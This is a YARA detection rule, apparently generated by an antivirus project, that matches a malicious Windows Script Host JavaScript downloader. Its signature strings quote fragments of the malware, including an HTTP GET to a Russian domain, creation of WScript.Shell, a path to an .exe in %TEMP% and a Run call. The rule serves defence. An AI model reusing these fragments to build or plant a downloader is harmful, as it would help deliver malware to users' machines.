rule sig_20160330_55d793c1676b03c37462672c33b537dd {
  meta:
    description = "datamaliciousorder - file 20160330_55d793c1676b03c37462672c33b537dd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b8c9a0de5d7344633f236d39fe94a6406996aee3424f2e279109b49f24090112"

  strings:
    $s1  = "X[E](\"GET\", \"http://jafes.ru/b0ros\", false);" fullword ascii
    $s2  = "function JB(O, VM){JY = JY * 1; return O - VM;};" fullword ascii
    $s3  = "var H = function SV() {return WScript[T0](\"WScript\"+\".Shell\");}(), AG = 11;" fullword ascii
    $s4  = "if (X[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function VT() {return H[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"MrbgqMolK.ex\" + \"e\";};" fullword ascii
    $s6  = "function R(){return Z + \"\";};" fullword ascii
    $s7  = "function F() {return ((ZE == true) && (ZE == LV)) ? 1 : JY;};" fullword ascii
    $s8  = "function TJ(U){H[\"Run\"](U, JY, JY);};" fullword ascii
    $s9  = "}while (Y);" fullword ascii
    $s10 = "return JB(R1, Q);" fullword ascii
    $s11 = "function G(){return T0;};" fullword ascii
    $s12 = "function T(WO0) {var FX = (1, 2, 3, 4, 5, WO0); return FX;};" fullword ascii
    $s13 = "var G0 = new this[\"Date\"]();" fullword ascii
    $s14 = "function WO()" fullword ascii
    $s15 = "function HT(){return 22;};" fullword ascii
    $s16 = "var I = false;" fullword ascii
    $s17 = "ZE = true; " fullword ascii
    $s18 = "var ZE = false;" fullword ascii
    $s19 = "var LV = false;" fullword ascii
    $s20 = "LV = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}